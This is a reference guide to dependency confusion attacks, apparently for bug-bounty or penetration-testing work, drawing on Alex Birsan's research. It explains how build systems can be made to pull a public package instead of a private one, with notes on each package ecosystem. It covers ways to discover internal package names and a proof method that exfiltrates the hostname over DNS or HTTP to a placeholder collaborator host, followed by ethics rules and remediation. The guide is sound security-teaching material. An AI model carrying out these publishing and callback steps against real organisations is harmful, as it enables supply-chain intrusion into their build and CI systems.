# Dependency Confusion — Deep Reference

Origin: Alex Birsan, "Dependency Confusion: How I Hacked Into Apple, Microsoft and
Dozens of Other Companies" (2021). He earned >$130k in bounties by getting code
executed inside 35+ orgs (Apple, Microsoft, Yelp, Tesla, Uber, …).
- https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610

## 1. The attack: public vs private registry resolution

Most package managers can be configured to consult **both** an internal/private
source and the **public** registry. The bug is not in the tool — it is the default
of preferring a "better" match (almost always the **highest version number**)
**regardless of source**.

If an org depends on an internal package `acme-internal-config` that lives only on
their private registry, and an attacker publishes `acme-internal-config` to the
matching **public** registry at a higher version, a build that queries both sources
may fetch the attacker's public package. The lifecycle/install hook then runs in the
org's build/CI environment.

**Version precedence is the lever.** Publish a version that out-ranks anything the
target could legitimately have (e.g. `9000.0.0`), so the resolver prefers it.

## 2. Finding internal package names

Birsan's sources, generalized:
- **Leaked manifests** in public repos: `package.json`, `package-lock.json`,
  `requirements.txt`, `Pipfile`, `pyproject.toml`, `pom.xml`, `build.gradle`,
  `Gemfile`/`Gemfile.lock`, `*.csproj`, `paket.dependencies`.
- **Client JS / source maps**: internal dependency names get inlined into webpack
  bundles during build; source maps (`//# sourceMappingURL=...`) expose module paths.
- **Accidentally-published packages**: an internal name briefly published publicly,
  then made private — the public slot may be free again or shows the name exists.
- **CI logs, Docker image layers, error stack traces** printing `require()`/import
  paths or registry URLs.
- **Automated scanning**: scrape JS across the target's domains to extract referenced
  package names at scale.

Per-ecosystem name shape:
- **npm**: scoped `@org/name` and unscoped `org-name`. Scoped names are only
  hijackable if the scope is **not** locked to a registry in `.npmrc`.
- **PyPI**: flat name in `requirements.txt` / `install_requires`. PyPI normalizes
  (`_`/`-`/case) — `Foo_Bar` and `foo-bar` collide.
- **Maven**: `groupId` + `artifactId` in `pom.xml` (`<dependency>`), or `group:name`
  in Gradle. The internal `groupId` (e.g. `com.acme.internal`) is the target.
- **RubyGems**: gem name in `Gemfile`/gemspec. RubyGems does **not** normalize, so
  `stripe` and `stripe-ruby` are unrelated names.
- **NuGet**: package id in `*.csproj` `<PackageReference>` or `packages.config`.

## 3. Per-ecosystem specifics

### npm
- Resolution searches configured registries; highest version usually wins.
- Hook: `preinstall` / `install` / `postinstall` in `scripts`.
- Defense and confirmation hinge on `.npmrc`: a `@scope:registry=https://...` line
  locks that scope to a private registry — those scoped names are NOT confusable.

### PyPI (pip)
- `pip install --extra-index-url <private>` consults **both** the private index and
  PyPI and installs the **higher version**. (`--index-url` would replace PyPI.)
- Execution path: code in `setup.py` runs at sdist build/install; or a build hook.
- Normalization means case/`_`/`-` variants map to the same project.

### Maven / Gradle
- `groupId` namespacing gives partial protection: Maven Central requires domain
  verification to *publish* under `com.example`. But that is publish-side friction,
  not consume-side safety — if `settings.xml`/`pom.xml` lets Maven query a public
  repo for your internal `groupId` at all, the attack works.
- Execution: a malicious build plugin/goal, or a dependency loaded into the build.

### RubyGems
- `gem install --source` exhibits the same multi-source precedence issue.
- No name normalization → exact-name collisions only.
- Execution: native extension build (`extconf.rb`) at install.

### NuGet
- Mitigated by **Package Source Mapping** in `nuget.config` (map `Acme.*` to the
  private feed only). Without mapping, mixed public/private feeds are confusable.
- Historically install/init PowerShell scripts ran on install.

## 4. The benign-callback proof technique

Goal: prove **execution inside target infrastructure** with the least intrusive
signal possible.

- Hook collects only **hostname** and **username** (Birsan also took path + external
  IP; keep it minimal — hostname/whoami is enough to attribute).
- **DNS exfil**: hex/base32-encode the hostname and send it as a subdomain query to
  your authoritative name server (`<encoded>.poc.your-collab.example`). Your server
  logs the query. DNS is preferred — it often egresses where HTTP is blocked and is
  low-noise.
- **HTTP exfil**: alternative `GET https://your-collab.example/poc?h=<hostname>`.
- A logged query/request from a **target egress IP or internal hostname pattern** is
  the proof. Correlate timestamp to your publish.

Use a dedicated collaborator (Burp Collaborator, interactsh, or your own
authoritative DNS + web logger). Never point the callback at a third party.

## 5. OOB infrastructure

- Own authoritative DNS for a subdomain → wildcard A record + query logging, or a
  tool like interactsh / Burp Collaborator that gives unique DNS+HTTP endpoints.
- Generate a unique token per package/target so callbacks are unambiguously attributable.
- Capture: timestamp, source IP, decoded hostname/username, requested token.

## 6. Ethics, program rules, and unpublishing

- **Benign only**: hostname/username callback. No secret/env/file exfil, no scanning,
  no persistence, no destructive action. The goal is to demonstrate execution, not to
  cause harm.
- **Program rules**: publishing to a public registry is an outward action affecting a
  shared ecosystem. Many programs prohibit it. **Confirm the scope/policy first.** If
  prohibited, report the unclaimed-internal-name exposure as a lower-severity finding
  without publishing.
- **Unpublish/yank** the placeholder as soon as proof is captured (npm unpublish,
  PyPI delete release, gem yank, NuGet unlist). Note this in the report.
- Redact any sensitive value a callback inadvertently surfaces.

## 7. Prevention (for the report's remediation section)

- **Scoped / namespaced packages** locked to the private registry:
  `.npmrc` → `@acme:registry=https://registry.acme.internal/`. Maven internal
  `groupId`; NuGet Package Source Mapping (`Acme.*` → private feed only).
- **Pin the source per package**, don't blend public+private with highest-version-wins
  (`--index-url` not `--extra-index-url`; virtual/proxy repo with correct precedence in
  Artifactory / Azure Artifacts).
- **Namespace reservation**: proactively register/claim all internal names on the
  public registries so an attacker can't.
- **Lockfiles + `npm ci`** (fail on mismatch, no rewrite); commit lockfiles.
- **Disable install scripts** where feasible: `.npmrc` `ignore-scripts=true`
  (OWASP NPM cheat sheet calls this the single most effective malicious-package
  mitigation); release-age windows (`min-release-age` / pnpm `minimumReleaseAge`).
- **Registry mirroring / allowlists**: source all deps through a controlled internal
  proxy that won't serve a public package for an internal name.

## 8. Sources
- Birsan: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- GitHub, avoiding npm substitution attacks: https://github.blog/security/supply-chain-security/avoiding-npm-substitution-attacks/
- OWASP NPM Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html
- NuGet Package Source Mapping: https://www.mykolaaleksandrov.dev/posts/2025/11/package-source-mapping/
- Maven settings.xml exposure: https://www.javacodegeeks.com/2026/05/dependency-confusion-attacks-in-maven-how-they-work-and-why-your-settings-xml-makes-you-vulnerable.html
- Sonatype namespace confusion protection: https://help.sonatype.com/en/namespace-confusion-protection.html
- GitGuardian, register private package names: https://blog.gitguardian.com/dependency-confusion-attacks/
- Cobalt pentester guide: https://www.cobalt.io/blog/a-pentesters-guide-to-dependency-confusion-attacks
